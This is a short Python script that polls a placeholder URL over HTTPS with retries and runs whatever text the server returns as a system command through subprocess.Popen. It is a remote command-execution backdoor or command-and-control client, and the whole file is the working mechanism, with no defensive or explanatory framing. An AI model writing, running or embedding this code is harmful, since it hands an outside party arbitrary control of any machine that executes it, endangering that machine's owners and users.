import requests
import random
import string
import subprocess
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

http = requests.Session()
retries = Retry(total=10, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
http.mount("https://", HTTPAdapter(max_retries=retries))

def get_command():
    url = 'https://domain_name/long_random_string/'
    data = http.get(url)
    if data.text != 'no':
        subprocess.Popen(data.text.split(" "))

get_command()